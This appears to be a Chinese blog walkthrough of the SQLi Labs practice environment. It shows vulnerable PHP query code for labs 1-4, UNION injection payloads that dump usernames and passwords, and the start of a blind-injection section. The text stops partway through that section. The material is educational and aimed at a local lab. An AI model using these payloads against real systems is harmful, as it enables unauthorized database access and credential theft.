<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/17b3c4485edf7c41.css" crossorigin="" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/3bc7e8f21884ab46.css" crossorigin="" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/204cf8343107233c.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-0342f5c61310a5b4.js" crossorigin=""/><script src="/_next/static/chunks/fd9d1056-e278622fa62dc0bf.js" async="" crossorigin=""></script><script src="/_next/static/chunks/69-faab496ef6116e58.js" async="" crossorigin=""></script><script src="/_next/static/chunks/main-app-ed6799cd4e1df27b.js" async="" crossorigin=""></script><script src="/_next/static/chunks/457b8330-b5c9cf3fcf214847.js" async=""></script><script src="/_next/static/chunks/d3ac728e-0c798b3b8aa3bf53.js" async=""></script><script src="/_next/static/chunks/612-fa632c1349770315.js" async=""></script><script src="/_next/static/chunks/120-aab2c7424ca78adb.js" async=""></script><script src="/_next/static/chunks/842-335eac9e82ade5ca.js" async=""></script><script src="/_next/static/chunks/app/(posts)/%5B...slug%5D/page-c9e2b3f85eaee606.js" async=""></script><script src="/_next/static/chunks/250-0ef8476c0fa8ee24.js" async=""></script><script src="/_next/static/chunks/372-ec5dc2d8977a9d05.js" async=""></script><script src="/_next/static/chunks/app/(posts)/layout-e15e5287e741ad91.js" async=""></script><script src="/_next/static/chunks/app/layout-9af8316721e2155d.js" async=""></script><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"></script><title>SQLi Labs - 铃木的网络日记</title><link rel="canonical" href="https://1kuzus.github.io/25d/sqli-labs/"/><link rel="icon" href="/favicon.ico" type="image/x-icon"/><script>
window.dataLayer = window.dataLayer || [];
function gtag() {
    dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'G-45BYSZ6WPY');
</script><script>
const currentTheme = localStorage.getItem('theme');
if (currentTheme !== 'light' && currentTheme !== 'dark') {
    localStorage.setItem('theme', 'light');
}
if (localStorage.getItem('theme') === 'dark') {
    document.documentElement.setAttribute('class', 'dark');
} else {
    document.documentElement.setAttribute('class', 'light');
}
</script><script>
if (!Array.prototype.findLast) {
    Array.prototype.findLast = function (callback) {
        for (let i = this.length - 1; i >= 0; i--) {
            if (callback(this[i])) return this[i];
        }
        return undefined;
    };
}
if (!Array.prototype.findLastIndex) {
    Array.prototype.findLastIndex = function (callback) {
        for (let i = this.length - 1; i >= 0; i--) {
            if (callback(this[i])) return i;
        }
        return -1;
    };
}
</script><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script></head><body><div id="header"><div id="header-left-wrapper"><a href="/"><div id="header-logo-bg"><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 1560 1560"><path fill="#00A8C4" d="M644 97h273l272 683H916z"></path><path fill="#30303C" d="M98 97h273l409 1024L1189 97h273L916 1462H644z"></path><path fill="#00F8FF" d="M98 1462 643 97h273L371 1462z"></path></svg></div></a></div><div id="header-right-wrapper"><button id="header-show-sidebar-button" class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024"><rect fill="#FCFCFC" x="100" y="148" width="824" height="128" rx="64"></rect><rect fill="#FCFCFC" x="100" y="448" width="824" height="128" rx="64"></rect><rect fill="#FCFCFC" x="100" y="748" width="824" height="128" rx="64"></rect></svg></button><button class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-dark-theme-icon"><path d="M525 939h-4a440 440 0 0 1-314-135 446 446 0 0 1-11-597A432 432 0 0 1 367 90a43 43 0 0 1 45 9 43 43 0 0 1 10 43 358 358 0 0 0 83 376 361 361 0 0 0 377 83 43 43 0 0 1 54 55 433 433 0 0 1-100 155 439 439 0 0 1-311 128z" fill="#FCFCFC"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-light-theme-icon"><path d="M512 61c13 0 25 8 30 20l28 68c11 29-5 62-36 73a66 66 0 0 1-22 3c-34 0-61-25-61-56 0-7 1-14 3-20l28-68c5-12 17-20 30-20zm0 902c-13 0-25-8-30-20l-28-68a53 53 0 0 1-3-20c0-31 27-56 61-56a66 66 0 0 1 22 3c31 11 47 44 36 73l-28 68c-5 12-17 20-30 20zm451-451c0 13-8 25-20 30l-68 28c-29 11-62-5-73-36a66 66 0 0 1-3-22c0-34 25-61 56-61 7 0 14 1 20 3l68 28c12 5 20 17 20 30zm-902 0c0-13 8-25 20-30l68-28a53 53 0 0 1 20-3c31 0 56 27 56 61a66 66 0 0 1-3 22 57 57 0 0 1-73 36l-68-28c-12-5-20-17-20-30zm132-319c10-9 24-12 35-7l68 28c29 13 41 47 26 77a66 66 0 0 1-13 18c-24 24-61 26-83 4a53 53 0 0 1-12-17l-28-68c-5-11-2-25 7-35zm638 638c-10 9-24 12-35 7l-68-28a53 53 0 0 1-17-12c-22-22-20-59 4-83a66 66 0 0 1 18-13c30-15 64-3 77 26l28 68c5 11 2 25-7 35zm0-638c9 10 12 24 7 35l-28 68a56 56 0 0 1-77 26 66 66 0 0 1-18-13c-24-24-26-61-4-83 5-5 11-9 17-12l68-28c11-5 25-2 35 7zM193 831c-9-10-12-24-7-35l28-68a53 53 0 0 1 12-17c22-22 59-20 83 4a66 66 0 0 1 13 18c15 30 3 64-26 77l-68 28c-11 5-25 2-35-7zm319-94a225 225 0 1 1 0-450 225 225 0 0 1 0 450z" fill="#FCFCFC"></path></svg></button><a href="https://github.com/1kuzus/1kuzus.github.io" target="_blank" rel="noreferrer"><div class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 1024 1024"><path d="M411 831c4-5 7-10 7-12v-70c-106 22-128-44-128-44-17-45-43-56-43-56-34-24 4-24 4-24 37 3 58 39 58 39 34 58 89 41 111 32 3-24 13-41 24-51-86-10-174-43-174-188 0-41 15-75 39-102-4-10-17-48 3-101 0 0 33-10 104 40 31-9 64-12 96-12s65 5 96 12c73-50 104-40 104-40 20 53 8 91 3 101 24 27 39 60 39 102 0 145-88 178-174 188 14 12 26 34 26 70v104c0 4 2 7 7 12 5 7 3 19-4 24-3 2-7 3-10 3H425c-10 0-17-6-17-17 0-5 2-8 3-10z" fill="#FCFCFC"></path></svg></div></a></div></div><div id="post-layout"><div id="main" class="center-wrapper"><div id="contents"><h4 id="contents-header">本页目录</h4></div><h1 class="x-post-title">SQLi Labs</h1><div class="post-meta"><code class="not-loaded">null likes<!-- --> · </code><code class="not-loaded">null views<!-- --> · </code><code>2025-11-13</code></div><!--$--><h2 class="x-h1">参考资料</h2><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/Audi-1/sqli-labs</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302" target="_blank" rel="noreferrer" class="x-inline-link">详细sqli-labs（1-65）通关讲解</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><a href="https://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noreferrer" class="x-inline-link">MySQL注入天书</a></p></div></div><h2 class="x-h1">前言</h2><p class="x-p">这一套SQL注入实验环境每个Lab都有不同的注入点和注入方式，不过由于实验并没有明确的通关条件，本文将按照个人的理解进行分类总结。可能和部分Lab的设计初衷有所出入。</p><p class="x-p">为了方便演示，定义<code class="x-inline-highlight">query_get</code>和<code class="x-inline-highlight">query_post</code>函数如下：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">import</span> requests

base_url <span class="token operator">=</span> <span class="token string">"http://localhost/sqli-labs/"</span>


<span class="token keyword">def</span> <span class="token function">query_get</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">"</span></span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp


<span class="token keyword">def</span> <span class="token function">query_post</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">/"</span></span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp
</code></pre></div><h2 class="x-h1">闭合：L1-L4</h2><h3 class="x-h2">前言 &amp; 笔记</h3><p class="x-p">这几个Lab是基础的SQL查询闭合。这部分Lab没有明确的通关条件，因此就以爆库为目标。</p><p class="x-p">常用的一些信息收集语句：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">查所有数据库：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>schemata</code></pre></div></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">查数据库<code class="x-inline-highlight">security</code>中的表：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span></code></pre></div></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">查表<code class="x-inline-highlight">security.users</code>中的列：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span> <span class="token operator">AND</span> table_name<span class="token operator">=</span><span class="token string">'users'</span></code></pre></div></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">查表<code class="x-inline-highlight">security.users</code>中的<code class="x-inline-highlight">username</code>和<code class="x-inline-highlight">password</code>数据：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> security<span class="token punctuation">.</span>users</code></pre></div></div></div><h3 class="x-h2">L1</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "</span></code></pre></div><img alt="img" loading="lazy" width="1710" height="401" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:100%;height:auto" src="/_next/static/media/L1.35007800.jpg"/><h3 class="x-h2">L2</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "</span></code></pre></div><h3 class="x-h2">L3</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id=('<span class="token interpolation"><span class="token variable">$id</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "</span></code></pre></div><h3 class="x-h2">L4</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(<span class="token interpolation"><span class="token variable">$id</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'?id=x") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '</span></code></pre></div><h2 class="x-h1">盲注：L5-L10</h2><h3 class="x-h2">前言 &amp; 笔记</h3><p class="x-p">有些场景下，服务端不会返回SQL查询结果，此时需要用到盲注技术。常见的盲注技术有基于布尔的盲注等、基于时间的盲注、基于报错的盲注。</p><p class="x-p">这一部分的Lab同样没有明确的通关条件，这里以查询<code class="x-inline-highlight">Angelina</code>用户的密码为目标：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> password <span class="token keyword">FROM</span> security<span class="token punctuation">.</span>users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'Angelina'</span></code></pre></div><p class="x-p">查询结果应为<code class="x-inline-highlight">I-kill-you</code>。</p><h4 class="x-h3">布尔盲注</h4><p class="x-p">如果查询成功/失败（有结果/无结果）时服务端的响应有差异（比如页面内容不同、响应长度不同），就可以利用这种差异进行布尔盲注。这几个Lab的成功/失败查询的响应内容都有多多少少的差异，布尔盲注可以通杀。</p><p class="x-p">以下的MySQL函数在盲注中非常有用：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">substr(str, pos, len)</code>：从字符串<code class="x-inline-highlight">str</code>的第<code class="x-inline-highlight">pos</code>个字符开始，截取长度为<code class="x-inline-highlight">len</code>的子串。<code class="x-inline-highlight">pos</code>从1开始计数。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> substr<span class="token punctuation">(</span><span class="token string">"abcdef"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">-- abc</span>
<span class="token keyword">SELECT</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 456</span>
</code></pre></div></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">ascii(ch)</code>：返回字符<code class="x-inline-highlight">ch</code>的ASCII码值，如果<code class="x-inline-highlight">ch</code>是字符串，则返回第一个字符的ASCII码值。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> ascii<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">-- 65</span>
<span class="token keyword">SELECT</span> ascii<span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 97</span>
